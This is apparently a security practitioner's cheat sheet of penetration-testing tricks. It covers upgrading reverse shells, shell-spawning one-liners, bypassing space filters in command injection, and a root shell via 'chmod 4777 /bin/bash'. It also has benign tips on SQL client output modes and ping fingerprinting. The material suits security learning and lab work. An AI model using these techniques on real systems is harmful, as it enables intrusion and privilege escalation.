# Here you can find some tricks I learned over the years of doing security work


## Python one line import
Python allows one line imports with the \_\_import\_\_ method. This can be used to run module code in one line to bypass restrictions. 
```py
__import__('some_module').some_function()
```

## Upgrade Reverse Shell with Python
When catching a reverse shell it's often just a primitive shell, that does not allow tab completion, ctrl-c or clear functionality.
Upgrading a primitive shell can solve these issues. First you need to spawn a proper pseudoterminal that acts like a normal terminal. 
This can be done via python with:
```bash
python -c "import pty; pty.spawn('/bin/bash')" # Spawn pseudo tty 
```
This allows you to interact with everything like you would with a normal terminqal.
No we disable the echo so that our commands are not displayed twice and enable raw tty to pass commands like ctrl-c straight through to our pseudo terminal with:
```bash
# Press ctrl-z to background the reverse shell
stty -a # List all tty settings
stty -echo raw;fg # Run this in your terminal not. (If you run zsh the ;fg is needed otherwise it can be done in two commands)
# You might need to press enter one or two times
stty rows <number_of_rows> cols <number_of_cols> # You get both numbers from stty -a
export TERM=xterm # Run in the pseudo terminal again to allow clear command
```

## Upgrading Shell without Python ([SRC](https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet))
```
script /dev/null -c bash
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
echo os.system('/bin/bash')
/bin/sh -i
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

## Upgrading a Windows Shell
Upgrading a windows shell is really hard. Possible ways are using a socat binary, a meterpreter shell or the following crude way using `rlwrap`:
```bash
rlwrap nc -lvnp <PORT>
```
When the reverseshell connects, it is partially interactive. It allows to use the arrows keys to edit the line and recall the command history.
Although this is a upgrade to a crude shell it still lacks some interactivity such as being able to CTRL-C a running program. I get some problems when
upgrading that shell fully though.

## Infinite Ping
On linux machines doing a ping results in a infinite running command. 
Thus pinging to check for command injection should be done with a max number of pings:
```bash
ping -c 5
```

## OS Fingerprinting with Ping
Different operating system have different inital TTL values when responding to a ping and thus can be fingerprinted:
```bash
ping -c 5 some_ip
# Linux TTL: Around 64
# Windows TTL Around 128
```

## Temporary Files
The `/dev/shm` 'directory' in Linux is a tempfs. The files placed in there are living in RAM only and thus are deleted with each reboot.
This makes it fast to write to and read from. 

## SSH Port Forwarding after connecting
When enabling `EnableEscapeCommandline` in your SSH config it is possible to use `~C` to change the SSH connection parameters allowing
to enable port forwarding and more. [See here](https://man.openbsd.org/ssh_config#EnableEscapeCommandline)

## Bypassing Space Restrictions
If you are restricted of using spaces in your command injections you might be able to bypass it with the following methods:
```bash
# 1. bash curly brace expansion
{echo,test} == echo test

# 2. IFS Variable
echo${IFS}test == echo test
```

## Fast root shell
If you only have restricted command injection as root you can try to change the permissions of /bin/bash to have the suid bit set, if you are already on the system
with another user.
```bash
chmod u+s /bin/bash
/bin/bash -p # as the other user

# Oneliner
chmod 4777 /bin/bash && /bin/bash -p
```

# Change output format of SQL clients
```bash
# SQLite
.mode table # Default mode, similar to box
.mode box # Create a box around everything
.mode line # Make rows instead of columns - This is really useful
.mode list # Simple list format
More modes can be found at https://sqlite.org/cli.html#changing_output_formats

# MySQL
SELECT * FROM table \G # \G does the same as the .mode line in SQLite

Postgres
\x on # Change to mode similar to .mode line
```

# Chrome Debug Port
When Chrome runs in debug mode it is possible to connect to it and see what the person is doing in that browser.


